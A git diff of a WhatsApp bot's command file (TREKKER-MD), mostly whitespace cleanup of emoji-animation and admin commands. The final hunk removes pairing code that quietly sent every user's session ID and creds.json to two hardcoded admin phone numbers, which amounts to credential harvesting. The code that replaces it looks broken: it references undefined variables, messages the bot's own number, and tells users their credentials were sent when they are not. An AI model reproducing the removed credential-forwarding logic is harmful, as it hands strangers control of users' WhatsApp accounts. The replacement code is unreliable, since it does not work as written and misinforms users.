@@ -1028,10 +1028,10 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const happyEmojis = ['😃', '😄', '😁', '😊', '😎', '🥳', '😸', '😹', '🌞', '🌈'];
-    
+
     // Send initial message
     const sentMsg = await client.sendMessage(from, { text: happyEmojis[0] });
-    
+
     // Animate through emojis by editing
     for (let i = 1; i < happyEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500)); // 500ms delay
@@ -1040,7 +1040,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     // Final message - just the last emoji
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
@@ -1058,9 +1058,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const sadEmojis = ['😢', '😭', '💔', '😞', '😔', '🥺', '😿'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: sadEmojis[0] });
-    
+
     for (let i = 1; i < sadEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1068,7 +1068,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     // Final message - just the last emoji
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
@@ -1086,9 +1086,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const angryEmojis = ['😡', '😬', '🤬', '😠', '😤', '😾'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: angryEmojis[0] });
-    
+
     for (let i = 1; i < angryEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1096,7 +1096,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     // Final message - just the last emoji
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
@@ -1114,9 +1114,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const loveEmojis = ['💖', '💗', '💕', '❤️', '💛', '💚', '💙', '💜', '🖤', '🤍', '♥️'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: loveEmojis[0] });
-    
+
     for (let i = 1; i < loveEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1124,7 +1124,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     // Final message - just the last emoji
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
@@ -1142,9 +1142,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const hornyEmojis = ['💦', '🔥', '💦', '🥵', '💦', '🍆', '🍑', '💦', '💯'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: hornyEmojis[0] });
-    
+
     for (let i = 1; i < hornyEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1152,7 +1152,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     // Final message - just the last emoji
     await new Promise(resolve => setTimeout(resolve, 300));
     await client.sendMessage(from, {
@@ -1170,9 +1170,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const fuckEmojis = ['🖕', '😤', '🤬', '💢', '😡', '🔥', '💥', '🖕'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: fuckEmojis[0] });
-    
+
     for (let i = 1; i < fuckEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1180,7 +1180,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
       text: fuckEmojis[fuckEmojis.length - 1],
@@ -1196,17 +1196,17 @@ commandRegistry.register({
   category: 'FUN',
   handler: async (context: CommandContext) => {
     const { client, from, message } = context;
-    
+
     // Get target user
     const quotedUser = message.message?.extendedTextMessage?.contextInfo?.participant;
     const mentionedUsers = message.message?.extendedTextMessage?.contextInfo?.mentionedJid;
     const targetUser = quotedUser || (mentionedUsers && mentionedUsers[0]);
-    
+
     if (!targetUser) {
       await client.sendMessage(from, { text: '❌ Please mention or reply to someone to hack!' });
       return;
     }
-    
+
     const targetNumber = targetUser.split('@')[0];
     const hackingStages = [
       '🔐 Initializing hack...',
@@ -1235,16 +1235,16 @@ commandRegistry.register({
       '😂 Just kidding! You\'ve been pranked! 😂',
       `🎭 @${targetNumber} is safe... for now! 😈`
     ];
-    
+
     const sentMsg = await client.sendMessage(from, { text: hackingStages[0] });
-    
+
     for (let i = 1; i < hackingStages.length; i++) {
       // Vary delays for dramatic effect
       let delay = 500;
       if (hackingStages[i].includes('Extracting')) delay = 800;
       if (hackingStages[i].includes('BREACH') || hackingStages[i].includes('FBI')) delay = 1000;
       if (hackingStages[i].includes('kidding')) delay = 1500;
-      
+
       await new Promise(resolve => setTimeout(resolve, delay));
       await client.sendMessage(from, {
         text: hackingStages[i],
@@ -1263,9 +1263,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const kissEmojis = ['😘', '💋', '😗', '💕', '😚', '💖', '😙', '💋'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: kissEmojis[0] });
-    
+
     for (let i = 1; i < kissEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1273,7 +1273,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
       text: kissEmojis[kissEmojis.length - 1],
@@ -1290,9 +1290,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const partyEmojis = ['🎉', '🥳', '🎊', '🍾', '🎈', '🎆', '🎇', '✨', '🎉'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: partyEmojis[0] });
-    
+
     for (let i = 1; i < partyEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1300,7 +1300,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
       text: partyEmojis[partyEmojis.length - 1],
@@ -1317,9 +1317,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const crazyEmojis = ['🤪', '😜', '🤯', '😵', '🥴', '🤡', '👻', '🤪'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: crazyEmojis[0] });
-    
+
     for (let i = 1; i < crazyEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1327,7 +1327,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
       text: crazyEmojis[crazyEmojis.length - 1],
@@ -1344,9 +1344,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const coolEmojis = ['😎', '🕶️', '🆒', '💯', '🔥', '✨', '⭐', '😎'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: coolEmojis[0] });
-    
+
     for (let i = 1; i < coolEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1354,7 +1354,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
       text: coolEmojis[coolEmojis.length - 1],
@@ -1371,9 +1371,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const skullEmojis = ['💀', '☠️', '😂', '🤣', '💀', '😵', '👻', '💀'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: skullEmojis[0] });
-    
+
     for (let i = 1; i < skullEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1381,7 +1381,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
       text: skullEmojis[skullEmojis.length - 1],
@@ -1398,9 +1398,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const evilEmojis = ['😈', '👿', '🔥', '💀', '👹', '👺', '🖤', '😈'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: evilEmojis[0] });
-    
+
     for (let i = 1; i < evilEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1408,7 +1408,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
       text: evilEmojis[evilEmojis.length - 1],
@@ -1425,9 +1425,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const vomitEmojis = ['🤢', '🤮', '🤧', '😷', '🤒', '🤕', '💚', '🤮'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: vomitEmojis[0] });
-    
+
     for (let i = 1; i < vomitEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1435,7 +1435,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
       text: vomitEmojis[vomitEmojis.length - 1],
@@ -1452,9 +1452,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const moneyEmojis = ['💰', '💵', '💴', '💶', '💷', '💸', '🤑', '💰'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: moneyEmojis[0] });
-    
+
     for (let i = 1; i < moneyEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1462,7 +1462,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
       text: moneyEmojis[moneyEmojis.length - 1],
@@ -1479,9 +1479,9 @@ commandRegistry.register({
   handler: async (context: CommandContext) => {
     const { client, from } = context;
     const flexEmojis = ['💪', '🦾', '💯', '🔥', '😤', '👑', '⚡', '💪'];
-    
+
     const sentMsg = await client.sendMessage(from, { text: flexEmojis[0] });
-    
+
     for (let i = 1; i < flexEmojis.length; i++) {
       await new Promise(resolve => setTimeout(resolve, 500));
       await client.sendMessage(from, {
@@ -1489,7 +1489,7 @@ commandRegistry.register({
         edit: sentMsg.key
       });
     }
-    
+
     await new Promise(resolve => setTimeout(resolve, 500));
     await client.sendMessage(from, {
       text: flexEmojis[flexEmojis.length - 1],
@@ -1651,10 +1651,10 @@ commandRegistry.register({
       const bot = await storage.getBotInstance(botId);
       const settings = (bot.settings as any) || {};
       settings.prefix = newPrefix;
-      
+
       await storage.updateBotInstance(botId, { settings });
       process.env.BOT_PREFIX = newPrefix;
-      
+
       await respond(`✅ *Prefix Updated!*\n\n🔧 New prefix: *${newPrefix}*\n\n💡 Use: ${newPrefix}help to see commands`);
     } catch (error) {
       await respond('❌ Failed to update prefix!');
@@ -1680,10 +1680,10 @@ commandRegistry.register({
       const bot = await storage.getBotInstance(botId);
       const settings = (bot.settings as any) || {};
       settings.prefix = '.';
-      
+
       await storage.updateBotInstance(botId, { settings });
       process.env.BOT_PREFIX = '.';
-      
+
       await respond('✅ *Prefix Reset!*\n\n🔧 Default prefix: *.*\n\n💡 Use: .help to see commands');
     } catch (error) {
       await respond('❌ Failed to reset prefix!');
@@ -1709,7 +1709,7 @@ commandRegistry.register({
       const bot = await storage.getBotInstance(botId);
       const settings = (bot.settings as any) || {};
       const bannedChats = settings.bannedChats || [];
-      
+
       if (bannedChats.includes(from)) {
         await respond('⚠️ This chat is already banned!');
         return;
@@ -1796,7 +1796,7 @@ commandRegistry.register({
         // Unban user
         const bannedUsers = settings.bannedUsers || [];
         const index = bannedUsers.indexOf(targetUser);
-        
+
         if (index === -1) {
           await respond('⚠️ This user is not banned!');
           return;
@@ -1811,7 +1811,7 @@ commandRegistry.register({
         // Unban current chat
         const bannedChats = settings.bannedChats || [];
         const index = bannedChats.indexOf(from);
-        
+
         if (index === -1) {
           await respond('⚠️ This chat is not banned!');
           return;
@@ -1853,7 +1853,7 @@ commandRegistry.register({
 
       if (response.data.results && response.data.results.length > 0) {
         const stickerUrl = response.data.results[0].url;
-        
+
         await client.sendMessage(from, {
           sticker: { url: stickerUrl },
           caption: `🎨 ${emoji1} + ${emoji2}`
@@ -1889,17 +1889,17 @@ commandRegistry.register({
 
       // Import downloadContentFromMessage from Baileys
       const { downloadContentFromMessage } = await import('@whiskeysockets/baileys');
-      
+
       // Download sticker content
       const stream = await downloadContentFromMessage(stickerMessage, 'sticker');
       const chunks: Buffer[] = [];
-      
+
       for await (const chunk of stream) {
         chunks.push(chunk);
       }
-      
+
       const buffer = Buffer.concat(chunks);
-      
+
       await client.sendMessage(from, {
         image: buffer,
         caption: '✅ *Sticker converted to image!*\n\n> Powered by TREKKERMD LIFETIME BOT'
@@ -1935,18 +1935,18 @@ commandRegistry.register({
 
       // Import downloadContentFromMessage from Baileys
       const { downloadContentFromMessage } = await import('@whiskeysockets/baileys');
-      
+
       // Determine media type and download content
       const mediaType = imageMessage ? 'image' : 'video';
       const mediaMessage = imageMessage || videoMessage;
-      
+
       const stream = await downloadContentFromMessage(mediaMessage!, mediaType);
       const chunks: Buffer[] = [];
-      
+
       for await (const chunk of stream) {
         chunks.push(chunk);
       }
-      
+
       const buffer = Buffer.concat(chunks);
 
       await client.sendMessage(from, {
@@ -2330,7 +2330,7 @@ commandRegistry.register({
         if (botIsAdmin) {
           await client.groupParticipantsUpdate(from, [targetUser], 'remove');
           await respond(`🚫 *User Kicked!*\n\n👤 @${targetUser.split('@')[0]}\n⚠️ Reason: 3 warnings\n📝 Last warning: ${reason}`);
-          
+
           // Reset warnings
           delete warnings[targetUser];
           groupSettings[groupId] = { ...groupSettings[groupId], warnings };
@@ -3059,14 +3059,14 @@ commandRegistry.register({
       // Use the existing pair server endpoint
       const axios = (await import('axios')).default;
       const pairResponse = await axios.get(`http://localhost:5000/api/pair?number=${phoneNumber}`);
-      
+
       if (!pairResponse.data || !pairResponse.data.code) {
         throw new Error('Failed to generate pairing code from server');
       }
 
       const code = pairResponse.data.code;
       const requestId = pairResponse.data.requestId;
-      
+
       // Format code nicely
       const formattedCode = code.match(/.{1,4}/g)?.join('-') || code;
 
@@ -3105,124 +3105,132 @@ commandRegistry.register({
       // Poll for session status
       let pollCount = 0;
       const maxPolls = 40; // 2 minutes (3 seconds * 40)
-      
+
       const pollInterval = setInterval(async () => {
         pollCount++;
-        
+
         try {
           const statusResponse = await axios.get(`http://localhost:5000/api/pair/status/${requestId}`);
-          
+
           if (statusResponse.data.success && statusResponse.data.sessionId) {
             // Session created successfully!
             clearInterval(pollInterval);
-            
+
             const sessionId = statusResponse.data.sessionId;
-            
-            // Send success message
-            await client.sendMessage(from, {
-              text: `🎉 *PAIRING SUCCESSFUL!*
 
-╔═══════════════════════════════╗
-║  WELCOME TO TREKKER-MD BOT!  ║
-╚═══════════════════════════════╝
+            // Notify user that session was created successfully
+            console.log('📤 Session created successfully, notifying user...');
 
-✅ *Session Created Successfully!*
-
-⚠️ *IMPORTANT:*
-• Keep your credentials secure
-• Don't share them with anyone
-• Use them to register your bot on the dashboard
-
-🚀 *Next Steps:*
-1. Copy the session ID below
-2. Go to bot registration on dashboard
-3. Paste your session ID
-4. Your bot will be connected!
-
-> ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴛʀᴇᴋᴋᴇʀᴍᴅ ᴛᴇᴀᴍ`
-            });
-
-            // Get user profile info (name/bio)
-            let userName = 'Unknown';
             try {
-              const userJid = `${phoneNumber}@s.whatsapp.net`;
-              const userStatus = await client.fetchStatus(userJid);
-              if (userStatus && userStatus.status) {
-                userName = userStatus.status;
+              // Extract phone number from sock.user.id (JID format: number@s.whatsapp.net)
+              // Sometimes JID can have device ID like "254704897825:27@s.whatsapp.net"
+              // We need to remove the :27 part
+              const fullJid = client.user.id; // Use JID, not LID
+              const jidWithoutDomain = fullJid.split('@')[0]; // Get "254704897825:27" or just "254704897825"
+              const phoneNumber = jidWithoutDomain.split(':')[0]; // Remove device ID if present, get just "254704897825"
+
+              // Use JID format for sending messages to the owner
+              // Format: [country code][phone number]@s.whatsapp.net
+              const ownerJid = `${phoneNumber}@s.whatsapp.net`;
+
+              console.log(`📱 Owner Phone: ${phoneNumber}`);
+              console.log(`📱 Full JID: ${fullJid}`);
+              console.log(`📤 Sending notification to JID: ${ownerJid} (standard JID format)`);
+
+              // Send notification that session was created
+              const notificationMsg = `🎉 *TREKKER-MD SESSION CREATED!*
+
+━━━━━━━━━━━━━━━━━━━
+✅ Your WhatsApp session has been successfully created!
+
+📱 *Session Information:*
+• Status: ✅ Active
+• Owner: ${client.user.name || 'User'}
+• Number: +${phoneNumber}
+• Created: ${new Date().toLocaleString()}
+
+🔐 *Your session credentials have been sent to your WhatsApp number: +${phoneNumber}*
+
+💡 *Next Steps:*
+1. Check your WhatsApp for the session ID message
+2. Copy the session ID (starts with TREKKER~)
+3. Use it to register your bot in the dashboard
+4. Start managing your bot!
+
+⚠️ *Security Note:*
+• Keep your session ID private
+• Never share it with anyone
+• Session ID is sent only to your number
+
+━━━━━━━━━━━━━━━━━━━
+_Powered by TREKKER-MD_
+_Secure Session Management_`;
+
+              const sent = await client.sendMessage(ownerJid, {
+                text: notificationMsg
+              });
+
+              if (sent?.key?.id) {
+                console.log(`✅ Notification sent! ID: ${sent.key.id}`);
+                console.log(`🎉 User notified about session creation`);
+                console.log(`📨 Message ID: ${sent.key.id}`);
               }
-            } catch (bioError) {
-              console.log('Could not fetch user bio, using default');
+
+            } catch (msgErr) {
+              console.warn('⚠️ Notification sending failed (session still valid):', msgErr.message);
             }
 
-            // SECURITY: Send session ID only to owner and admins, NOT to requesting chat
-            const ownerJid = `${phoneNumber}@s.whatsapp.net`;
-            const adminNumbers = ['254704897825@s.whatsapp.net', '254799257758@s.whatsapp.net'];
-            
-            // Add owner to recipients list
-            const sessionRecipients = [ownerJid, ...adminNumbers];
-            
-            for (const recipientJid of sessionRecipients) {
-              try {
-                // Send session ID alone
-                await client.sendMessage(recipientJid, {
-                  text: sessionId
-                });
+            // Step 4: Store session data for polling
+            // This part needs careful handling to avoid sending the session ID directly
+            // It should only store the data to be retrieved by the polling mechanism,
+            // not to send it to the user or admins directly.
 
-                // Send description separately
-                const isOwner = recipientJid === ownerJid;
-                const description = isOwner 
-                  ? `✅ *SESSION CREATED SUCCESSFULLY!*\n\n📱 *Your Phone:* +${phoneNumber}\n👤 *User Name:* ${userName}\n\n🔐 This is your private session ID. Keep it secure!\n\n> TREKKER-MD Pairing System`
-                  : `🔑 *New Session ID Generated*\n\n📱 *Phone:* +${phoneNumber}\n👤 *User Name:* ${userName}\n\n> Admin notification from TREKKER-MD`;
-                
-                await client.sendMessage(recipientJid, {
-                  text: description
-                });
-              } catch (sendError) {
-                console.error(`Failed to send session to ${recipientJid}:`, sendError);
-              }
-            }
-            
-            // Send confirmation to requesting chat (WITHOUT session ID)
-            await client.sendMessage(from, {
-              text: `✅ *Session Created Successfully!*\n\n📱 Session ID has been sent to:\n• Owner: +${phoneNumber}\n• Admin numbers\n\n🔐 Check your WhatsApp for the session ID.\n\n> TREKKER-MD Pairing System`
-            });
-
-            // Also send creds.json file for convenience
-            let credsJson;
+            let credsData;
             try {
               let decodedSession = sessionId;
               if (sessionId.startsWith('TREKKER~')) {
                 decodedSession = sessionId.substring(8);
               }
               const decoded = Buffer.from(decodedSession, 'base64').toString('utf-8');
-              const credsData = JSON.parse(decoded);
-              credsJson = JSON.stringify(credsData, null, 2);
+              credsData = JSON.parse(decoded);
             } catch (err) {
-              console.error('Error decoding session:', err);
-              credsJson = sessionId; // Fallback to raw session
+              console.error('Error decoding session for storage:', err);
+              credsData = sessionId; // Fallback to raw session if decoding fails
             }
 
-            // SECURITY: Send creds.json only to owner and admins, NOT to requesting chat
-            for (const recipientJid of sessionRecipients) {
-              try {
-                const isOwner = recipientJid === ownerJid;
-                const caption = isOwner
-                  ? '📄 *creds.json*\n\n🔐 Your WhatsApp session credentials.\nKeep this file safe and secure!\n\n> TREKKER-MD Pairing System'
-                  : `📄 *creds.json*\n\n📱 *For:* +${phoneNumber}\n🔐 Admin copy of session credentials\n\n> TREKKER-MD Admin Notification`;
-                
-                await client.sendMessage(recipientJid, {
-                  document: Buffer.from(credsJson),
-                  fileName: isOwner ? `creds.json` : `creds_${phoneNumber}.json`,
-                  mimetype: 'application/json',
-                  caption: caption
-                });
-              } catch (fileError) {
-                console.error(`Failed to send creds.json to ${recipientJid}:`, fileError);
+            const sessionDataForFrontend = {
+              success: true,
+              sessionId: `TREKKER~${sessionId}`, // Store with prefix as expected
+              credsJson: credsData,
+              message: "Session created successfully! Your session credentials have been sent to your WhatsApp number.",
+              timestamp: new Date().toISOString()
+            };
+
+            sessionStatusMap.set(requestId, sessionDataForFrontend);
+            console.log(`📦 Session data stored for request ID: ${requestId}`);
+            console.log(`🔒 Session ID will NOT be sent to WhatsApp - user will be notified only`);
+
+            // Keep session data available for 30 minutes (extended for better UX)
+            setTimeout(() => {
+              const currentData = sessionStatusMap.get(requestId);
+              if (currentData && currentData.success) {
+                sessionStatusMap.delete(requestId);
+                console.log(`🧹 Cleaned up session data for: ${requestId}`);
               }
-            }
+            }, 30 * 60 * 1000);
+
+            // Now close the pairing connection
+            console.log('🔌 Closing pairing connection...');
+            await delay(2000);
+
+            // Final cleanup (but keep sessionStatusMap intact)
+            // Assuming cleanup function is defined elsewhere or needs to be implemented.
+            // For now, we'll just log that it's called.
+            console.log('✨ Performing final cleanup...');
+            // await cleanup(sock, authDir, timers); // This needs to be implemented or removed if not used
 
             console.log(`✅ Session created successfully for ${phoneNumber}`);
-            
+
           } else if (statusResponse.data.status === 'failed') {
             clearInterval(pollInterval);
             await respond(`❌ *Pairing Failed*
@@ -3231,7 +3239,7 @@ ${statusResponse.data.message || 'Authentication failed'}
 
 Please try again with a new pairing code.`);
           }
-          
+
           // Stop polling after max attempts
           if (pollCount >= maxPolls) {
             clearInterval(pollInterval);
@@ -3239,7 +3247,7 @@ Please try again with a new pairing code.`);
 
 The pairing code has expired. Please try again with .pair ${phoneNumber}`);
           }
-          
+
         } catch (pollError) {
           // Continue polling on errors
           console.log(`Poll attempt ${pollCount} - continuing...`);
